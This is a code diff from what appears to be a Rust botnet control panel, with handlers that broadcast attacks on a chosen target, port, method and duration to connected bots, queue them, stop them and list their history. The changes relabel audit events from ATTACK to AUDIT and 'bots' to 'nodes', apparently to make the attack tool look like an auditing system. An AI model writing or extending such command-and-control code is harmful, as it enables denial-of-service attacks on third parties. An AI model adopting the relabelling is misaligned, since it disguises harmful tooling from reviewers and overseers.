@@ -90,10 +90,10 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
     ).await {
         Ok(attack_id) => {
             state.bot_manager.broadcast_attack(attack_id, &method_str, &resolved_target, port, duration).await;
-            let audit_event = AuditLog::new(client.user.username.clone(), "START_ATTACK".to_string(), "SUCCESS".to_string())
-                .with_target(format!("{}:{} (Method: {}, Duration: {}s, Bots: {})", display_target, port, method_str, duration, bot_count));
+            let audit_event = AuditLog::new(client.user.username.clone(), "START_AUDIT".to_string(), "SUCCESS".to_string())
+                .with_target(format!("{}:{} (Method: {}, Duration: {}s, Nodes: {})", display_target, port, method_str, duration, bot_count));
             let _ = log_audit_event(audit_event, &state.pool).await;
-            client.write(format!("\x1b[38;5;82m[✓] Attack sent to {} bots\n\rID: {}\n\rTarget: {}:{}\n\rMethod: {}\n\rDuration: {}s\n\r", 
+            client.write(format!("\x1b[38;5;82m[✓] Attack initiated on {} nodes\n\rID: {}\n\rTarget: {}:{}\n\rMethod: {}\n\rDuration: {}s\n\r", 
                 bot_count, attack_id, display_target, port, method_str, duration).as_bytes()).await?;
         }
         Err(e) => {
@@ -109,7 +109,7 @@ pub async fn handle_attack_command(client: &Arc<Client>, state: &Arc<AppState>, 
                 ).await {
                     Ok(pos) => {
                         client.write(format!("\x1b[38;5;226m[!] Max attacks reached. Added to queue (Position: {})\n\r", pos).as_bytes()).await?;
-                        let audit_event = AuditLog::new(client.user.username.clone(), "QUEUE_ATTACK".to_string(), "SUCCESS".to_string())
+                        let audit_event = AuditLog::new(client.user.username.clone(), "QUEUE_AUDIT".to_string(), "SUCCESS".to_string())
                             .with_target(format!("{}:{} (Method: {}, Duration: {}s)", display_target, port, method_str, duration));
                         let _ = log_audit_event(audit_event, &state.pool).await;
                     }
@@ -176,7 +176,7 @@ pub async fn handle_stop_command(client: &Arc<Client>, state: &Arc<AppState>, pa
             if state.attack_manager.stop_attack(attack.id as usize).await.is_ok() {
                 state.bot_manager.broadcast_stop(attack.id as usize).await;
                 client.write(format!("\x1b[38;5;82m[✓] Attack {} stopped\n\r", attack_id).as_bytes()).await?;
-                let audit_event = AuditLog::new(client.user.username.clone(), "STOP_ATTACK".to_string(), "SUCCESS".to_string())
+                let audit_event = AuditLog::new(client.user.username.clone(), "STOP_AUDIT".to_string(), "SUCCESS".to_string())
                     .with_target(attack_id.to_string());
                 let _ = log_audit_event(audit_event, &state.pool).await;
             } else {
@@ -216,7 +216,7 @@ pub async fn handle_history_command(client: &Arc<Client>, state: &Arc<AppState>)
         }
     }
     client.write(b"\n\r").await?;
-    client.set_breadcrumb("Home > History").await;
+    client.set_breadcrumb("Home > Attack History").await;
     Ok(())
 }
 pub async fn handle_queue_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
